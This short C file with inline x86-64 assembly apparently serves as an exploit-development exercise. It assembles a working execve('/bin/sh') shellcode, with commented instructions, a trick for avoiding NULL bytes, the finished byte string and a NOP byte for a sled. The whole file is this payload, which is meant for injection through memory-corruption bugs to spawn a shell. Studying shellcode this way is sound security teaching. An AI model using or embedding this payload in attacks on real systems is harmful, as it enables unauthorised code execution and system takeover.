/*
  "".join(reversed(re.findall('..', binascii.hexlify("/bin/sh"))))
  # => "68732f6e69622f"
*/
void shellcode_to_disasm()
{
  __asm__(" xor %rdx, %rdx \n"    // char **envp (= NULL)
          " mov $0x68732f6e69622f2f, %rbx \n"
                                  // "/" (no 0x00!) + "/bin/sh"
          " shr $0x8, %rbx \n"    // >> to "/bin/sh" + "\x00"
          " push %rbx \n"         // push filename (= "/bin/sh")
          " mov %rsp, %rdi \n"    // char *filename
          " push %rdx \n"         // push NULL (end of argv)
          " push %rdi \n"         // push filename (argv[0])
          " mov %rsp, %rsi \n"    // char **argv
          " mov $0x3b, %al \n"    // sys_execve
          " syscall \n"           // call
          " nop ");               // nop (for sled)
}

char shellcode[] =  "\x48\x31\xd2"
                    "\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68"
                    "\x48\xc1\xeb\x08"
                    "\x53"
                    "\x48\x89\xe7"
                    "\x52"
                    "\x57"
                    "\x48\x89\xe6"
                    "\xb0\x3b"
                    "\x0f\x05";
char nop[] =        "\x90";

int main()
{
  return 0;
}
